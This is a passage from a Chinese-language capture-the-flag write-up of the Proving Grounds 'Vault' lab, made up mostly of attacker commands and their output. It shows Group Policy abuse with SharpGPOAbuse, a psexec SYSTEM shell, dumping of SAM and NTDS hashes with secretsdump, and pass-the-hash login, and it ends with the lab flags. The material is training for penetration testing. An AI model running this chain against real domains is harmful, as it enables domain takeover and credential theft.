+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments&gt; upload SharpGPOAbuse.exe
+</span></span><span class="line"><span class="cl">Info: Uploading SharpGPOAbuse.exe to C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>ocuments<span class="se">\S</span>harpGPOAbuse.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                                             
+</span></span><span class="line"><span class="cl">Data: <span class="m">94208</span> bytes of <span class="m">94208</span> bytes copied
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Upload successful!</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行 SharpGPOAbuse.exe，将anirudh用户帐户添加到本地管理员组，传递用户名，并传递我们具有写入权限的组策略。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName &#34;Default Domain Policy&#34;
+</span></span><span class="line"><span class="cl">[+] Domain = vault.offsec
+</span></span><span class="line"><span class="cl">[+] Domain Controller = DC.vault.offsec
+</span></span><span class="line"><span class="cl">[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+</span></span><span class="line"><span class="cl">[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+</span></span><span class="line"><span class="cl">[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+</span></span><span class="line"><span class="cl">[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+</span></span><span class="line"><span class="cl">[+] The GPO does not specify any group memberships.
+</span></span><span class="line"><span class="cl">[+] versionNumber attribute changed successfully
+</span></span><span class="line"><span class="cl">[+] The version number in GPT.ini was increased successfully.
+</span></span><span class="line"><span class="cl">[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+</span></span><span class="line"><span class="cl">[+] Done!</span></span></code></pre></td></tr></table>
+</div>
+</div><p>更新本地组策略</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; gpupdate /force
+</span></span><span class="line"><span class="cl">Updating policy...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Computer Policy update has completed successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Policy update has completed successfully.</span></span></code></pre></td></tr></table>
+</div>
+</div><p>验证当前用户是否成功添加到本地管理员组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; net localgroup administrators
+</span></span><span class="line"><span class="cl">Alias name     administrators
+</span></span><span class="line"><span class="cl">Comment        Administrators have complete and unrestricted access to the computer/domain
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Members
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">anirudh
+</span></span><span class="line"><span class="cl">The command completed successfully.</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下去就可以用RDP登录到目标主机上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
+</span></span><span class="line"><span class="cl">└─$ xfreerdp /u:anirudh /p:&#39;SecureHM&#39; /v:192.168.202.172 /sec:nla /dynamic-resolution +clipboard /drive:share,/home/xavier/project/ /tls-seclevel:0</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209230516809.png" alt="image-20240209230516809" srcset="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209230516809.png?size=small, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209230516809.png?size=medium 1.5x, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209230516809.png?size=large 2x" data-title="image-20240209230516809" style="--width: 1019px;--aspect-ratio: 1019 / 357;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>也可以使用 psexec 获取交互式shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">xavier</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">OSCP</span><span class="o">/</span><span class="n">PG_Practice</span><span class="o">/</span><span class="n">Vault</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">psexec</span> <span class="n">vault</span><span class="o">.</span><span class="n">offsec</span><span class="o">/</span><span class="n">anirudh</span><span class="p">:</span><span class="n">SecureHM</span><span class="err">@</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">202.172</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">10.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2022</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">202.172</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="o">$</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">tAligQWE</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">202.172</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">ycfe</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">202.172</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">ycfe</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17763.2300</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">type</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">desktop</span>\<span class="n">proof</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">12</span><span class="n">ef329cf77b22fb67e52b389022be6d</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以使用anirudh，获取administrator等用户的hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ impacket-secretsdump vault.offsec/anirudh:SecureHM@192.168.202.172
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Service RemoteRegistry is in stopped state
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service RemoteRegistry
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> SAM hashes extraction <span class="k">for</span> user WDAGUtilityAccount failed. The account doesn<span class="err">&#39;</span>t have <span class="nb">hash</span> information.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping LSA Secrets
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="nv">$MACHINE</span>.ACC 
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:54ff9c380cf1a80c23467ff51919146e:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c660d4355b25d08a42130cb43d93418c:::
+</span></span><span class="line"><span class="cl">anirudh:1103:aad3b435b51404eeaad3b435b51404ee:74c8075e8506407ebe49bb8de63f6057:::
+</span></span><span class="line"><span class="cl">DC$:1000:aad3b435b51404eeaad3b435b51404ee:04a4f11933ff6e77b6b03a8591cfb48e:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
+</span></span><span class="line"><span class="cl">……</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233026955.png" alt="image-20240209233026955" srcset="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233026955.png?size=small, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233026955.png?size=medium 1.5x, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233026955.png?size=large 2x" data-title="image-20240209233026955" style="--width: 898px;--aspect-ratio: 898 / 866;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后使用Administrator登录，这时候已经是域管理员账户权限了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 192.168.202.172 -u administrator -H 54ff9c380cf1a80c23467ff51919146e
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine                                                                                 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">vault<span class="se">\a</span>dministrator
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; net user administrator
+</span></span><span class="line"><span class="cl">User name                    Administrator
+</span></span><span class="line"><span class="cl">Full Name
+</span></span><span class="line"><span class="cl">Comment                      Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">User<span class="err">&#39;</span>s comment
+</span></span><span class="line"><span class="cl">Country/region code          <span class="m">000</span> <span class="o">(</span>System Default<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Account active               Yes
+</span></span><span class="line"><span class="cl">Account expires              Never
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password last <span class="nb">set</span>            11/19/2021 5:43:21 AM
+</span></span><span class="line"><span class="cl">Password expires             Never
+</span></span><span class="line"><span class="cl">Password changeable          11/20/2021 5:43:21 AM
+</span></span><span class="line"><span class="cl">Password required            Yes
+</span></span><span class="line"><span class="cl">User may change password     Yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Workstations allowed         All
+</span></span><span class="line"><span class="cl">Logon script
+</span></span><span class="line"><span class="cl">User profile
+</span></span><span class="line"><span class="cl">Home directory
+</span></span><span class="line"><span class="cl">Last logon                   2/9/2024 12:43:43 AM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Logon hours allowed          All
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Local Group Memberships      *Administrators
+</span></span><span class="line"><span class="cl">Global Group memberships     *Domain Admins        *Group Policy Creator
+</span></span><span class="line"><span class="cl">                             *Domain Users         *Schema Admins
+</span></span><span class="line"><span class="cl">                             *Enterprise Admins
+</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233103826.png" alt="image-20240209233103826" srcset="/posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233103826.png?size=small, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233103826.png?size=medium 1.5x, /posts/provinggrounds-vault/resource/23-W-H-Vault.assets/image-20240209233103826.png?size=large 2x" data-title="image-20240209233103826" style="--width: 877px;--aspect-ratio: 877 / 740;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="flag" class="heading-element"><span>flag</span>
+  <a href="#flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">anirudh/SecureHM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\a</span>nirudh<span class="se">\D</span>esktop<span class="se">\l</span>ocal.txt
+</span></span><span class="line"><span class="cl">6379a394e97f465833bd2a2d72fe5d56
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\p</span>roof.txt
+</span></span><span class="line"><span class="cl">12ef329cf77b22fb67e52b389022be6d</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-02-09 15:31:05">更新于 2024-02-09&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrounds-nagoya/" class="post-nav-item" rel="prev" title="ProvingGrounds Nagoya Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds Nagoya Writeup</a><a href="/posts/provinggrounds-butch/" class="post-nav-item" rel="next" title="ProvingGrounds Butch Writeup">ProvingGrounds Butch Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
